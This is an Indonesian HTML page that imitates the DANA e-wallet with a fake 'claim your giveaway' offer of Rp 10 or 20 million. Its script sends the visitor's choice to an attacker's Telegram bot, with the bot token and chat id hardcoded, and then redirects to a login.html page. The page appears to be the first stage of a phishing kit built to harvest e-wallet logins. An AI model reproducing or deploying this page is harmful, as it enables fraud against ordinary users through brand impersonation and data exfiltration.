
<!DOCTYPE html>
<html lang="id">

<head>
	<meta charset="UTF-8">
	<meta property="og:image:type" content="image/jpeg">
	<meta property="og:image" content="https://iconlogovector.com/uploads/images/2023/03/lg-8b694ad63ac093b84ec0972a7c442d7c61.jpg">
	<meta name="theme-color" content="#118EEA">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<title>Aktivasi Saldo DANA</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #118eea;
      margin: 0;
      padding: 0;
    }

    .wrapper {
      max-width: 500px;
      margin: auto;
      padding: 20px 15px 80px; /* space buat nav bawah */
    }

    .custom-img {
      width: 100%;
      border: 2px solid #000;
      border-radius: 10px;
      box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
      margin-bottom: 15px;
    }

    h2 {
      font-size: clamp(12px, 4vw, 18px);
      color: #118eea;
      padding: 8px;
      border: 1px solid #ddd;
      background-color: #fff;
      border-radius: 10px;
      margin-bottom: 15px;
    }

    /* Tombol Mewah */
    .button {
      display: block;
      width: 100%;
      padding: clamp(10px, 2vw, 14px);
      margin: 10px 0;
      font-size: clamp(14px, 2.5vw, 18px);
      font-weight: bold;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      color: white;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      box-shadow: 0 4px 10px rgba(0, 114, 255, 0.4);
      transition: all 0.3s ease;
    }

    .button:hover {
      transform: scale(1.05);
      box-shadow: 0 6px 15px rgba(0, 114, 255, 0.6);
    }

    .button:active {
      transform: scale(0.97);
      box-shadow: 0 3px 8px rgba(0, 114, 255, 0.4);
    }

    .responsive {
      width: 50%;
      border-radius: 10px;
      margin-top: 15px;
    }

    nav.bottom {
      width: 100%;
      position: fixed;
      bottom: 0;
      left: 0;
      z-index: 1000;
      background-color: #118eea;
    }

    nav.bottom img {
      width: 100%;
      display: block;
    }
  </style>
</head>
<body>

  <div class="wrapper">
    <img class="custom-img" src="ban.jpg" alt="Banner">

    <h2>KLAIM DANA GIVEAWAYMU SEKARANG!</h2>

    <button class="button" onclick="sendToTelegram('💸 Rp. 10.000.000')">💸 Rp. 10.000.000</button>
    <button class="button" onclick="sendToTelegram('💸 Rp. 20.000.000')">💸 Rp. 20.000.000</button>
    
    <img class="responsive" src="img/a/AVvXsEjvnci2Re0CnUgH-ouIxZlMDWsLPxCVv1qy1GSlhU2P6o_5t-MmoSjm_h01jiWwyTWHa7RGU_YU-_7NEgliavS27_FDVYV2zFnexyIy0lB9BXGghNC6HAtxvJSPGogzJZtNhMq8OTbZXAPMvBLEad7YNJUfUiB_RJGyeBmacBkgGjlJN7fMiCsRShtjAbC-" alt="">
  </div>

  <nav class="bottom">
    <img src="img/b/R29vZ2xl/1704436332522.png" alt="Nav Bawah">
  </nav>

  <script>
    function sendToTelegram(choice) {
      var token = "8366211098:AAEFq7b4LNeaZ0tM052PPGz6_i9fLZPKVM4";
      var chat_id = "7609564871";
      var message = `📌 FROM PILIHAN DANA %0A%0A✅ Pilihan: ${choice}`;

      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            window.location.href = "login.html";
          } else {
            alert("Gagal mengirim data ke Telegram!");
          }
        })
        .catch(error => {
          alert("Terjadi kesalahan: " + error);
        });
    }
  </script>

</body>
